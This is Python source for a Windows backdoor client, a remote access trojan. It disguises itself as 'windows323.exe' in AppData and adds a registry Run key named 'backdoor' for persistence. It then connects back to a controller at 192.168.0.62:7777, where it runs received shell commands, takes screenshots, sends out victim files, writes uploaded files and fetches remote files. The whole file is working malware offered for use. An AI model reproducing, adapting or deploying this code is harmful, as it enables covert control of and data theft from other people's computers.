import os
import socket
import base64
import subprocess
import requests
import mss
import time
import shutil
import sys
class Client():
    def __init__(self):
        self.serverIp = '192.168.0.62'
        self.admin = None
        self.createPersistence()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection()

    # connect server
    def connect(self):
        self.client.connect((self.serverIp, 7777))

    # windows persistence
    def createPersistence(self):
        # stored inside Roaming folder
        location = os.environ['appdata'] +'\\windows323.exe'
        if not os.path.exists(location):
            # copy this file on infected client
            shutil.copyfile(sys.executable, location)
            # add to register - backdoor = register name
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)


    # listening
    def shell(self):
        self.clientSend(os.getcwd(), True)

        while True:
            res = self.client.recv(1024).decode('utf-8')
            
            if res == 'exit':
                self.close()
                break

            elif res[:2] == 'cd' and len(res) > 2:
                self.cdCommand(res)

            elif res[:8] == "download":
                self.downloadCommand(res)

            elif res[:6] == "upload":
                self.uploadCommand(res)

            elif res[:3] == "get":
                self.requestFile(res[4:])

            elif res[:10] == "screenshot":
                self.screenshotCommand()

            elif res[:5] == "start":
                self.execCommand(res[6:])

            elif res[:5] == "check":
                self.adminCheckCommand()

            else:
                result = self.processCommand(res)
                
                if len(result) == 0:
                    self.clientSend('1', True)
                else:
                    # print(result.decode(encoding='windows-1252'))
                    self.clientSend(result, False)

    # recurring connection
    def connection(self):
        while True:
            time.sleep(5)
            try:
                self.connect()
                self.shell()
            except Exception:
                self.connection()

    # screenshot command
    def screenshotCommand(self):
        try:
            screen = mss.mss()
            screen.shot()
            with open("monitor-1.png", 'rb') as file_send:
                self.client.send(base64.b64encode(file_send.read()))
            os.remove("monitor-1.png")
        except Exception:
            self.clientSend("fail", True)

    # exec terminal commands
    def execCommand(self, res):
        try:
            subprocess.Popen(res[6:], shell=True)
            self.clientSend("-- Started correctly", True)
        except Exception:
            self.clientSend(" --- Error on exec", True)

    # send info
    def clientSend(self, value, encoding = False):
        if encoding == True:
            self.client.send(value.encode())
        else:
            self.client.send(value)

    # list command
    def cdCommand(self, res):
        os.chdir(res[3:])
        result = os.getcwd()
        self.clientSend(result, True)

    # download file command
    def downloadCommand(self, res):
        with open(res[9:], 'rb') as file_download:
            self.client.send(base64.b64encode(file_download.read())) 

    # other commands
    def processCommand(self, res):
        proc   = subprocess.Popen(res, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()

        return result

    # upload file command
    def uploadCommand(self, res):
        with open(res[7:], 'wb') as file_upload:
            data = self.client.recv(30000)
            file_upload.write(base64.b64decode(data))

    # close connection
    def close(self):
        self.client.close()

    def requestFile(self, url):
        try:
            request = requests.get(url)
            fileName = url.split("/")[-1]
            with open(fileName, "wb") as file_get:
                file_get.write(request.content)
            self.clientSend("-- Downloaded correctly", True)
        except:
            self.clientSend("--- Error Downloading!!!!!", True)

    # admin check role access
    def adminCheckCommand(self):
        try:
            check = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
            self.admin = "--- Admin role"
        except Exception:
            self.admin = "--- Error admin role"
        # else:
        #     self.admin = "--- Admin role"

        self.clientSend(self.admin, True)

